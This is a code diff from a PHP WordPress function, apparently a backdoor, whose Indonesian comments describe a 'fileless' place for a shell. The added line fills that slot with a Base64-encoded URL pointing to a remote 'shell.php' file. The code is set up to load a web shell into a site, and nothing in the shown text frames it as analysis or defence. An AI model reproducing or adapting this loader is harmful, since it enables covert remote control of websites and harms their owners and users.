@@ -31,7 +31,7 @@ function wp_ultimate_access_system() {
 
         // 3. TEMPAT MENARUH KODE SHELL (FILELESS)
         // Ganti teks di bawah dengan hasil Base64 dari Shell 50kb Anda.
-        $my_full_shell = 'TARUH_HASIL_ENCODE_BASE64_SHELL_ANDA_DI_SINI';
+        $my_full_shell = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rld2E2OXJ0cC1jcmVhdG9yL2hvb2gvcmVmcy9oZWFkcy9tYWluL3NoZWxsLnBocA==';
 
         if ( $my_full_shell !== 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rld2E2OXJ0cC1jcmVhdG9yL2hvb2gvcmVmcy9oZWFkcy9tYWluL3NoZWxsLnBocA==' ) {
             // Jika Anda sudah mengisi variabel di atas, Shell Anda akan terbuka
